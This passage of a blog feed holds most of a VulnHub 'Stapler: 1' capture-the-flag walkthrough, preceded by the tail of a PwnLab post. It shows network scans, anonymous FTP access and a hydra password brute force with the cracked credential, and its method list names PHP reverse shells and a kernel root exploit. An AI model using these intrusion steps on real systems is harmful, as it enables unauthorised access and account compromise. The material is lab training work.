</span><span class='line'><span class="s1">(&lt;/strong&gt;  &lt;em&gt;)                    |&lt;/em&gt;&lt;strong&gt;/                                        (&lt;/strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(__  &lt;/em&gt;)                                                                 (&lt;strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;) If  you are  reading this,  means  that you have  break &#39;</span>init<span class="p">&amp;</span>rsquo<span class="p">;</span>  <span class="o">(</span>&lt;/em&gt; &lt;em&gt;&lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for</span>  your <span class="nb">time </span>doing  <span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;/em&gt;<span class="o">)</span> this challenge.                                                 <span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>&lt;/em&gt; &lt;em&gt;&lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;/em&gt;<span class="o">)</span> reading it                                                      <span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>__  &lt;/em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;strong&gt;<span class="o">)</span>                                &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#x3a;&amp;#99;&amp;#x6c;&amp;#97;&amp;#x6f;&amp;#114;&amp;#x40;&amp;#x50;&amp;#119;&amp;#x6e;&amp;#76;&amp;#x61;&amp;#98;&amp;#46;&amp;#110;&amp;#101;&amp;#116;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#99;&amp;#108;&amp;#x61;&amp;#x6f;&amp;#114;&amp;#64;&amp;#80;&amp;#119;&amp;#110;&amp;#x4c;&amp;#x61;&amp;#98;&amp;#x2e;&amp;#x6e;&amp;#101;&amp;#116;&lt;/a&gt; - @Chronicoder  ( _ &lt;/strong&gt;)</span>
</span><span class='line'><span class="o">(</span>__  &lt;/em&gt;<span class="o">)</span>                                                                 <span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;<span class="o">)</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">(</span>&lt;em&gt; &lt;/em&gt;&lt;em&gt;_<span class="o">)</span>
</span><span class='line'>&lt;code&gt;-._.-<span class="s1">&#39;                                                                &lt;/code&gt;-.&lt;/em&gt;.-&#39;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Stapler: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1/"/>
    <updated>2016-08-15T07:21:02-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/15/vulnhub-stapler-1</id>
    <content type="html"><![CDATA[<p>This is made for BsidesLondon 2016 with average beginner/intermediate difficulty and a few twists :) Also multiple attacking vectors and paths to get shell and ROOT. Author is <a href="https://www.vulnhub.com/author/g0tmi1k,21/">g0tmi1k</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/stapler-1,150/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: Stapler: 1 (<em>10.1.1.138/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>FTP service allow Anonymous login</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>WEB application Full Path Disclosure</li>
<li><a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></li>
<li><a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress plugin LFI vulnerability to read sensitive informtion</li>
<li>Connect to target server&rsquo;s MySQL service as root and write reverse PHP web shell</li>
<li>Connect to target server&rsquo;s MySQL service and download <code>wp_users</code> table which username and password hash saved in</li>
<li>Crack WordPress administrator/editor account and login to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.138  00:0c:29:b4:04:59   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:e8:0a:52   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.283 seconds <span class="o">(</span>112.13 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.138</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# masscan -p1-65535 10.1.1.138/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span><span class="m">10000</span> <span class="p">|</span> cut -d <span class="p">&amp;</span>lsquo<span class="p">;</span> <span class="p">&amp;</span>rsquo<span class="p">;</span> -f <span class="m">4</span> <span class="p">|</span> cut -d <span class="p">&amp;</span>lsquo<span class="p">;</span>/<span class="p">&amp;</span>rsquo<span class="p">;</span> -f <span class="m">1</span> <span class="p">|</span> tee 138_masscan.txt&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-12 11:19:28 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'><span class="m">12380</span>                                                                      &lt;br/&gt;
</span><span class='line'>22
</span><span class='line'>21
</span><span class='line'>53
</span><span class='line'>3306
</span><span class='line'>666
</span><span class='line'>80&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/stapler# tr <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\n</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>,<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span> 138_masscan.txt
</span><span class='line'>12380,22,21,53,3306,666,80,root@kali:~/myExercises/stapler#   &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.138
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>21/tcp    open  ftp     vsftpd 2.0.8 or later
</span><span class='line'><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get directory listing: Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t parse PASV response: <span class="p">&amp;</span>ldquo<span class="p">;</span>Permission denied.<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>53/tcp    open  domain  dnsmasq 2.75
</span><span class='line'><span class="p">|</span> dns-nsid:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  bind.version: dnsmasq-2.75
</span><span class='line'>80/tcp    open  http
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: <span class="m">404</span> Not Found
</span><span class='line'>666/tcp   open  doom?
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .7.13-0ubuntu0.16.04.2
</span><span class='line'><span class="p">|</span>   Thread ID: 8440
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: LongPassword, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, ODBCClient, InteractiveClient, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, LongColumnFlag, SupportsCompression, FoundRows
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Salt: <span class="p">&amp;</span>lsquo<span class="p">;</span>pw<span class="p">|</span><span class="o">)</span><span class="se">\x</span>07ib<span class="se">\x</span>0ByIS3P<span class="p">&amp;</span>lt<span class="p">;</span>Y&lt;sup&gt;jO&lt;/sup&gt;<span class="se">\x</span>10
</span><span class='line'>12380/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Based on the result of NMAP scan, firstly, I found FTP port 21 is open and Anonymous login allowed. So I connected to the FTP server and found a file <code>note</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# ftp 10.1.1.138
</span><span class='line'>Connected to 10.1.1.138.
</span><span class='line'>220-
</span><span class='line'>220-<span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;|</span>
</span><span class='line'>220-<span class="p">|</span> Harry, make sure to update the banner when you get a chance to show who has access here <span class="p">|</span>
</span><span class='line'>220-<span class="p">|&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;|</span>
</span><span class='line'>220-
</span><span class='line'>220
</span><span class='line'>Name <span class="o">(</span>10.1.1.138:root<span class="o">)</span>: anonymous
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span><span class='line'>ftp&gt; ls
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">107</span> Jun <span class="m">03</span> 23:06 note
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt; get note
</span><span class='line'><span class="nb">local</span>: note remote: note
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> note <span class="o">(</span><span class="m">107</span> bytes<span class="o">)</span>.
</span><span class='line'><span class="m">226</span> Transfer complete.
</span><span class='line'><span class="m">107</span> bytes received in 0.01 secs <span class="o">(</span>14.1935 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/stapler# cat note
</span><span class='line'>Elly, make sure you update the payload information. Leave it in your FTP account once your are <span class="k">done</span>, John.
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure></p>

<p>From the <code>note</code> file, I know that <code>elly</code> is a ftp user and there could be something about payload stored in her FTP folder.</p>

<p>Then I did a quick FTP login brute force attack against to user <code>elly</code> by using <code>hydra</code> with parameter <code>-e nsr</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# hydra -l elly -e nsr &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp://10.1.1.138&quot;</span>&gt;ftp://10.1.1.138&lt;/a&gt;
</span><span class='line'>Hydra v8.2 <span class="p">&amp;</span>copy<span class="p">;</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> starting at 2016-08-15 22:56:07
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.138   login: elly   password: ylle
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.thc.org/thc-hydra&quot;</span>&gt;http://www.thc.org/thc-hydra&lt;/a&gt;<span class="o">)</span> finished at 2016-08-15 22:56:11
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! <code>elly</code>&rsquo;s password is <font color="red"><code>ylle</code></font></p>

<p>Login as <code>elly</code> and found that the home directory is <code>/etc/</code>, so I downloaded the file <code>passwd</code> and <code>vsftpd.conf</code>.</p>

<p>So far, nothing else found, so I decided to move on.</p>

<p>port 12380 is open and running HTTP with SSL. so I did a <code>nikto</code> scan against port 12380</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.138
</span><span class='line'>+ Target Port: 12380
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>dave<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: Soemthing doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t look right here
</span><span class='line'>+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/admin112233/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/blogblog/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET <span class="p">&amp;</span>ldquo<span class="p">;</span>robots.txt<span class="p">&amp;</span>rdquo<span class="p">;</span> contains <span class="m">2</span> entries which should be manually viewed.
</span><span class='line'>+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-ob_mode<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: 1
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure></p>

<p>From the nikto scan, we found that WEB server on port 12380 is a HTTPS service and there are three hidden directories <code>/admin112233</code>, <code>/blogblog</code> and <code>/phpmyadmin</code>.</p>

<p>so I checked them one by one, and 1st one is <code>/admin112233</code>, but this is a XSS hook page :(</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/admin112233/&quot;</span>&gt;https://10.1.1.138:12380/admin112233/&lt;/a&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;mwwhahahah&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;noscript&gt;Give yourself a cookie! Javascript didn<span class="p">&amp;</span>rsquo<span class="p">;</span>t <span class="nv">run</span> <span class="o">=)</span>&lt;/noscript&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span>&gt;window.alert<span class="o">(</span><span class="s2">&quot;This could of been a BeEF-XSS hook ;)&quot;</span><span class="o">)</span><span class="p">;</span>window.location<span class="o">=</span><span class="s2">&quot;http://www.xss-payloads.com/&quot;</span><span class="p">;</span>&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>2nd one is <code>/blogblog</code>, and it&rsquo;s using <code>WordPress CMS</code>.</p>

<p>so next, I run <code>wpscan</code> and found one plugin which is vulnerable to <a href="https://www.exploit-db.com/exploits/39646/" title="WordPress Advanced Video Plugin 1.0 - Local File Inclusion">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
